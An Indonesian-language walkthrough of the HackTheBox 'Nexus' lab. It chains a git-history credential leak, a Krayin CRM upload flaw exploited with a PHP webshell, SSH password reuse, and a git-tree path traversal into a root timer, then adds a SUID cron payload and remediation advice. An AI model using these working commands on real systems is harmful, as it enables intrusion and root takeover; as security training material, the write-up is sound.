# HackTheBox — Nexus (Linux) — Dokumentasi Lengkap

> Target: `10.129.133.27` (`nexus.htb`)
> Tingkat kesulitan: Easy
> Rantai: **Recon vhost → Gitea (kebocoran kredensial di history git) → Krayin CRM v2.2.0 (CVE-2026-38526 RCE) → post-exploit & credential reuse → SSH `jones` → privesc path traversal `gitea-template-sync` → root**

Dokumen ini disusun berurutan (recon → root), berisi **perintah persis**, **penjelasan singkat "kenapa"**, **remediation**, dan **script otomatis** di folder `exploits/`.

---

## Daftar Isi
1. [Ringkasan & Peta Serangan](#1-ringkasan--peta-serangan)
2. [Informasi Target](#2-informasi-target)
3. [Recon](#3-recon)
4. [Enumerasi Gitea & Kebocoran Kredensial](#4-enumerasi-gitea--kebocoran-kredensial)
5. [Foothold — Krayin CRM v2.2.0 (CVE-2026-38526 RCE)](#5-foothold--krayin-crm-v220-cve-2026-38526-rce)
6. [Post-Exploit — Baca .env Live & Credential Reuse → SSH jones](#6-post-exploit--baca-env-live--credential-reuse--ssh-jones)
7. [Privilege Escalation — Path Traversal `gitea-template-sync` → root](#7-privilege-escalation--path-traversal-gitea-template-sync--root)
8. [Kredensial & Flag](#8-kredensial--flag)
9. [Remediation](#9-remediation)
10. [Daftar Script](#10-daftar-script)

---

## 1. Ringkasan & Peta Serangan

```
nexus.htb (situs perusahaan, lowongan kerja)
   └─► email bocor: careers@nexus.htb, j.matthew@nexus.htb
ffuf vhost → git.nexus.htb (Gitea)   +   billing.nexus.htb (Krayin CRM)
   └─► repo publik admin/krayin-docker-setup
        └─► history git (commit lama) → DB_PASSWORD = N27xh!!2ucY04
billing.nexus.htb (Krayin CRM v2.2.0)
   └─► login j.matthew@nexus.htb : N27xh!!2ucY04
        └─► CVE-2026-38526: upload shell.php → RCE sebagai www-data
www-data
   └─► baca /var/www/krayin/.env → DB_PASSWORD = y27xb3ha!!74GbR
        └─► credential reuse → SSH jones (user.txt)
jones
   └─► systemd timer root: gitea-template-sync.timer (tiap 1 menit)
        └─► /etc/gitea/template-sync.py: os.path.join(stage, filepath) TANPA sanitasi
             └─► push repo template berisi tree "../" → tulis /root/.ssh/authorized_keys
                  └─► SSH root → root.txt
```

**Dua akar masalah utama:**
- **Password reuse** di mana-mana (SSH `jones`, DB MySQL, Krayin CRM, Gitea memakai password yang sama).
- **Kepercayaan buta pada input** — Krayin mempercayai nama/ekstensi file yang dikirim klien, dan `template-sync.py` mempercayai path dari `git ls-tree` sebagai path filesystem yang aman.

---

## 2. Informasi Target

| Item | Nilai |
|------|-------|
| IP | `10.129.133.27` |
| Hostname | `nexus.htb` (situs "Nexus Energy Authority") |
| OS | Linux (Ubuntu, kernel 6.8.0-111-generic) |
| Port terbuka | `22/tcp` OpenSSH 9.6p1 Ubuntu; `80/tcp` nginx 1.24.0 (Ubuntu) |
| Vhost | `nexus.htb`, `git.nexus.htb` (Gitea), `billing.nexus.htb` (Krayin CRM) |
| Layanan internal | `127.0.0.1:3000` (Gitea), `127.0.0.1:3306` (MySQL), `127.0.0.1:33060` (MySQL X) |
| Foothold | `www-data` via Krayin upload RCE |
| User | `jones` (uid 1000) |
| Root | via path traversal pada systemd timer root |

---

## 3. Recon

### 3.1 Setup host
```bash
# /etc/hosts
echo "10.129.133.27 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

### 3.2 Scan port
```bash
nmap -sC -sV -p- -T4 10.129.133.27
```
Hasil: hanya **22 (SSH)** dan **80 (HTTP)** yang terbuka.

### 3.3 Halaman utama & email bocor
```bash
curl -s http://nexus.htb/ -o /tmp/nexus_index.html
grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+' /tmp/nexus_index.html | sort -u
```
Menemukan:
- `careers@nexus.htb` (alamat melamar kerja)
- `j.matthew@nexus.htb` ("our hiring manager")

### 3.4 Enumerasi vhost (ffuf)
Semua Host acak mengembalikan `302` ukuran `154` (vhost default) → filter `-fs 154`.
```bash
ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" \
     -w /usr/share/wordlists/dnsmap.txt -fs 154
```
Hasil penting:
```
git      [Status: 200, Size: 14474, Words: 1195, Lines: 242]
```
→ `git.nexus.htb` = **Gitea**. (Lalu ditemukan juga `billing.nexus.htb` = Krayin CRM.)

Fingerprint Gitea:
```bash
curl -s -H "Host: git.nexus.htb" http://10.129.133.27/ | grep -i '<title>'
# <title>Gitea: Git with a cup of tea</title>
```

---

## 4. Enumerasi Gitea & Kebocoran Kredensial

### 4.1 Cari repo publik
```bash
curl -s -H "Host: git.nexus.htb" "http://10.129.133.27/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json;print([r['full_name'] for r in json.load(sys.stdin)['data']])"
```
→ repo publik: `admin/krayin-docker-setup`.

### 4.2 `.env` di HEAD kosong, tapi ada di HISTORY
`DB_PASSWORD` pada branch `main` (HEAD) **sengaja dikosongkan**, tetapi masih ada di **commit lama**. Solusinya: **clone penuh** dan periksa riwayat.

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git /tmp/nexus_git
cd /tmp/nexus_git
git log --oneline --all
git log -p -- .env            # lihat perubahan .env antar commit
git show 1615c465:.env | grep DB_PASSWORD
```
Hasil:
```
DB_PASSWORD=N27xh!!2ucY04
```
> **Pelajaran:** saat menemukan repo git, selalu periksa **history** (`git log -p`), bukan hanya file di HEAD. Rahasia yang "dihapus" sering masih ada di commit lama.

### 4.3 Kredensial awal yang didapat
| Akun | Kredensial | Sumber |
|------|-----------|--------|
| Krayin CRM `j.matthew@nexus.htb` | `N27xh!!2ucY04` | history git Gitea |

---

## 5. Foothold — Krayin CRM v2.2.0 (CVE-2026-38526 RCE)

### 5.1 Identifikasi versi
```bash
curl -s --resolve billing.nexus.htb:80:10.129.133.27 -L \
     "http://billing.nexus.htb/admin/login" -o /tmp/klogin.html
```
Login sebagai `j.matthew@nexus.htb`, lalu di footer panel admin:
```html
<!-- Version -->
    Version: 2.2.0
```
→ **Krayin CRM v2.2.0** (Laravel 12.54.1, PHP 8.3.6).

### 5.2 CVE-2026-38526 (Unrestricted File Upload → RCE)
| Item | Nilai |
|------|-------|
| CVE | **CVE-2026-38526** |
| Jenis | Arbitrary File Upload → RCE (CWE-434 + CWE-94) |
| Endpoint | `POST /admin/tinymce/upload` |
| Privilege | Perlu login (akun apa pun) |
| File rentan | `packages/Webkul/Admin/src/Http/Controllers/TinyMCEController.php` |
| Dampak | RCE sebagai `www-data` |

Akar masalah (kode):
```php
$filename = md5($file->getClientOriginalName().time()).'.'.$file->getClientOriginalExtension();
$path = $file->storeAs($this->storagePath, $filename);
$this->sanitizeSvg($path, $file);   // di-skip untuk non-SVG
```
- Tidak ada whitelist ekstensi → `.php` diterima.
- `sanitizeSvg()` hanya jalan untuk SVG.
- Disk default `public` (`storage/app/public` → symlink `public/storage/`) di-serve nginx **sebagai PHP**.

### 5.3 Langkah exploit (manual)
```bash
# 1) Login & simpan cookie + ambil XSRF
curl -s -c /tmp/kj.txt "http://billing.nexus.htb/admin/login" -o /tmp/l.html
TOK=$(grep -oE 'name="_token"[^>]*value="[^"]+"' /tmp/l.html | grep -oE 'value="[^"]+"' | head -1 | sed 's/value="//;s/"//')
curl -s -b /tmp/kj.txt -c /tmp/kj.txt -X POST "http://billing.nexus.htb/admin/login" \
     --data-urlencode "_token=$TOK" \
     --data-urlencode "email=j.matthew@nexus.htb" \
     --data-urlencode "password=N27xh!!2ucY04"
XSRF=$(python3 -c "import urllib.parse;print(urllib.parse.unquote(open('/tmp/kj.txt').read().split('XSRF-TOKEN')[1].split()[0]))")

# 2) Upload webshell
printf '%s' '<?php system($_GET["c"]); ?>' > /tmp/s.php
curl -s -b /tmp/kj.txt -H "X-XSRF-TOKEN: $XSRF" -H "X-Requested-With: XMLHttpRequest" \
     -F "file=@/tmp/s.php;type=image/jpeg" \
     "http://billing.nexus.htb/admin/tinymce/upload"
# → {"location":"http://billing.nexus.htb/storage/tinymce/<md5>.php"}

# 3) Eksekusi
curl "http://billing.nexus.htb/storage/tinymce/<md5>.php?c=id"
# uid=33(www-data) ...
```
> Script otomatis: `exploits/cve-2026-38526_krayin_upload_rce.py`

---

## 6. Post-Exploit — Baca .env Live & Credential Reuse → SSH jones

### 6.1 Baca `.env` aplikasi yang LIVE
`.env` di repo berbeda dengan `.env` produksi. Yang asli ada di server:
```bash
curl "http://billing.nexus.htb/storage/tinymce/<md5>.php?c=cat%20/var/www/krayin/.env"
```
Isi penting:
```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR     <-- password DB aplikasi yang asli
```

### 6.2 Cek user sistem & credential reuse
```bash
curl ".../shell.php?c=cat%20/etc/passwd" | grep -iE 'sh$'
# jones:x:1000:1000::/home/jones:/bin/bash
```
Password DB `y27xb3ha!!74GbR` ternyata **dipakai ulang** sebagai password login sistem `jones`:
```bash
ssh jones@10.129.133.27      # password: y27xb3ha!!74GbR
jones@nexus:~$ id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
jones@nexus:~$ cat /home/jones/user.txt
88e8f65d8edd6ac3628735a7d3c52adb
```
> Script helper SSH tanpa sshpass: `exploits/ssh_exec_helper.py`

---

## 7. Privilege Escalation — Path Traversal `gitea-template-sync` → root

### 7.1 Enumerasi standar (semuanya bersih)
```bash
sudo -l                       # Sorry, user jones may not run sudo on nexus.
find / -perm -4000 -type f    # hanya SUID bawaan
cat /etc/crontab              # tidak ada job menarik
ss -tlnp                      # 127.0.0.1:3000 (Gitea), 3306 (MySQL)
```
Karena checklist klasik bersih, pertanyaannya bergeser ke: **"Apa yang dijalankan root secara berkala/otomatis?"**

### 7.2 Temukan timer root
```bash
systemctl list-timers --all --no-pager | grep -i template
# ... gitea-template-sync.timer   gitea-template-sync.service
systemctl status gitea-template-sync.timer --no-pager
systemctl cat gitea-template-sync.service
systemctl cat gitea-template-sync.timer
```
`gitea-template-sync.service`:
```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```
Timer berjalan **setiap 1 menit sebagai root**.

### 7.3 Analisis bug
`/etc/gitea/template-sync.py` (dapat dibaca `jones`):
```python
# ambil semua repo yang ditandai "template"
for repo in get_template_repos(token):
    # baca tree git
    result = subprocess.run(['git','ls-tree','-r','HEAD'], cwd=bare_path, ...)
    for line in result.stdout.split('\n'):
        meta, filepath = line.split('\t', 1)      # filepath dari git
        ...
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)   # <-- TANPA sanitasi!
        os.makedirs(os.path.dirname(target), exist_ok=True)
        open(target, 'wb').write(cat_result.stdout)   # <-- ditulis sebagai ROOT
```
`os.path.join("/home/git/template-staging/jones/tmpl", "../../../../../root/.ssh/authorized_keys")` → `/root/.ssh/authorized_keys`.

`git ls-tree` mengembalikan path mentah dari tree, dan **git mengizinkan `..` sebagai nama entri tree**. Script memakai path itu langsung → **arbitrary root file write**.

### 7.4 Langkah exploit
**(a) Buat repo dan tandai sebagai template** (sebagai `jones`):
```bash
curl -s -u 'jones:y27xb3ha!!74GbR' -H 'Content-Type: application/json' \
  -X POST -d '{"name":"tmpl","private":false,"auto_init":false}' \
  http://git.nexus.htb/api/v1/user/repos
curl -s -u 'jones:y27xb3ha!!74GbR' -H 'Content-Type: application/json' \
  -X PATCH -d '{"template":true}' \
  http://git.nexus.htb/api/v1/repos/jones/tmpl
```

**(b) Bangun tree git berisi path traversal.** `git mktree` menolak `..`, jadi objek tree ditulis **manual** (raw object) — lihat `exploits/gitea_template_sync_traversal.py`. Inti:
```python
blob = write_obj("blob", PUBKEY)                       # isi = public key
name = b"../../../../../root/.ssh/authorized_keys"     # nama entri = traversal
entry = b"100644 " + name + b"\x00" + bytes.fromhex(blob)
tree  = write_obj("tree", entry)
commit = write_obj("commit", b"tree %s\nauthor j <j@x.t> %d +0000\n..." )
```

**(c) Push** ke Gitea (dari target agar Gitea lokal di `127.0.0.1:3000`):
```bash
git push http://jones:y27xb3ha!!74GbR@127.0.0.1:3000/jones/tmpl.git <commit>:refs/heads/main --force
```

**(d) Tunggu timer (~60s) & verifikasi log:**
```bash
tail -5 /var/log/template-sync.log
# [..] Found 1 template repo(s)
# [..] Syncing template: jones/tmpl
# [..]   synced: ../../../../../root/.ssh/authorized_keys   <-- key ditulis sebagai root
```

**(e) SSH sebagai root:**
```bash
ssh -i /tmp/rootkey root@10.129.133.27 'id; cat /root/root.txt'
# uid=0(root) gid=0(root) groups=0(root)
# f94ed03964390186815fa09f11311cce
```
> Alternatif payload: tulis `/etc/cron.d/<name>` berisi `* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`, lalu `/tmp/rootbash -p`.

---

## 8. Kredensial & Flag

### Kredensial
| Konteks | Nilai | Sumber |
|---------|-------|--------|
| Krayin CRM `j.matthew@nexus.htb` | `N27xh!!2ucY04` | history git Gitea (commit `1615c465`) |
| MySQL `krayin` (DB live) | `y27xb3ha!!74GbR` | `/var/www/krayin/.env` |
| SSH / sistem user `jones` | `y27xb3ha!!74GbR` | reuse dari `.env` |
| Gitea user `jones` | `y27xb3ha!!74GbR` | reuse |
| MySQL root (DB, jika ada) | *(tidak dipakai)* | — |

### Flag
| Flag | Nilai | Lokasi |
|------|-------|--------|
| user.txt | `88e8f65d8edd6ac3628735a7d3c52adb` | `/home/jones/user.txt` |
| root.txt | `f94ed03964390186815fa09f11311cce` | `/root/root.txt` |

---

## 9. Remediation

### 9.1 Password & kredensial
- **Jangan reuse** password antar layanan (SSH, DB, aplikasi, Gitea). Gunakan secrets manager / password unik per layanan.
- Rotasi semua kredensial yang pernah ada di `.env` dan history git.
- Bersihkan **history git** (`git filter-repo` / BFG) untuk rahasia yang pernah ter-commit; jangan hanya menghapus di commit baru.

### 9.2 Krayin CRM / CVE-2026-38526 (upload → RCE)
- **Upgrade** Krayin ke versi yang sudah menambal (saat publikasi: UNPATCHED → perlakukan sebagai kritis).
- Validasi **whitelist ekstensi + MIME asli** di server (bukan header klien):
  ```php
  $allowed = ['jpg','jpeg','png','gif','webp','svg'];
  $ext = strtolower($file->getClientOriginalExtension());
  if (!in_array($ext, $allowed, true)) abort(415);
  if (!str_starts_with($file->getMimeType(), 'image/')) abort(415);
  ```
- **Matikan eksekusi PHP** di direktori upload (nginx `location ~ \.php$ { deny all; }`, Apache `php_flag engine off`).
- Simpan upload di **luar web root**, sajikan via controller ber-autentikasi.
- Batasi `/admin` di belakang VPN/allowlist + MFA; alert untuk `POST /admin/tinymce/upload` dan file `.php` baru di folder upload.
- Aktifkan `APP_DEBUG=false` di produksi (target ini `APP_DEBUG=true`).

### 9.3 `template-sync.py` (privesc)
- **Jalankan sebagai least-privilege** (mis. `User=git`), bukan `root`. Ini yang mengubah bug traversal menjadi kompromi total.
- **Sanitasi path** sebelum menulis:
  ```python
  base = os.path.realpath(stage_path)
  target = os.path.realpath(os.path.join(stage_path, filepath))
  if not target.startswith(base + os.sep):
      log("blocked traversal: %s" % filepath); continue
  ```
- Tolak entri git yang mengandung `..` atau path absolut.
- Jangan memproses input dari repo yang bisa dibuat user biasa sebagai root.

### 9.4 Umum
- Perbarui OpenSSH/nginx; nonaktifkan login password bila memungkinkan (pakai key saja).
- Prinsip least privilege untuk semua layanan internal (`127.0.0.1:3000`, MySQL).
- Monitoring: pembuatan file root baru di `/root`, `/etc/cron.d`, `/etc/systemd`.

---

## 10. Daftar Script

Semua di folder `exploits/`:

| Script | Fungsi |
|--------|--------|
| `recon.sh` | Recon otomatis: nmap, email, ffuf vhost, Gitea, kebocoran history git |
| `cve-2026-38526_krayin_upload_rce.py` | Login Krayin → upload webshell → RCE (CVE-2026-38526) |
| `krayin_read_env_via_webshell.py` | Upload webshell & baca file (mis. `/var/www/krayin/.env`) |
| `gitea_template_sync_traversal.py` | Bangun tree git `../` + push ke Gitea (privesc → root) |
| `ssh_exec_helper.py` | SSH non-interaktif pakai password (tanpa sshpass) |
| `ssh_password_login.py` | Login SSH interaktif via pty (tanpa sshpass) |

### Contoh pemakaian
```bash
# 1) RCE Krayin (login + upload + jalankan perintah)
python3 exploits/cve-2026-38526_krayin_upload_rce.py \
  --url http://billing.nexus.htb --host 10.129.133.27 \
  --email j.matthew@nexus.htb --password 'N27xh!!2ucY04' --cmd 'id'

# 2) Baca .env live
python3 exploits/krayin_read_env_via_webshell.py \
  --url http://billing.nexus.htb --host 10.129.133.27 \
  --email j.matthew@nexus.htb --password 'N27xh!!2ucY04' \
  --file /var/www/krayin/.env

# 3) Privesc template-sync (jalankan di target sebagai jones, atau arahkan ke git.nexus.htb)
python3 exploits/gitea_template_sync_traversal.py \
  --gitea http://127.0.0.1:3000 --user jones --password 'y27xb3ha!!74GbR' \
  --repo tmpl --pubkey /tmp/rootkey.pub --target-path ../../../../../root/.ssh/authorized_keys

# 4) SSH non-interaktif
python3 exploits/ssh_exec_helper.py --host 10.129.133.27 --user jones \
  --password 'y27xb3ha!!74GbR' --cmd 'id; cat ~/user.txt'
```

---

*Dokumen ini dibuat dari pengujian langsung terhadap lab HTB "Nexus". Gunakan hanya pada lingkungan yang Anda miliki izin.*
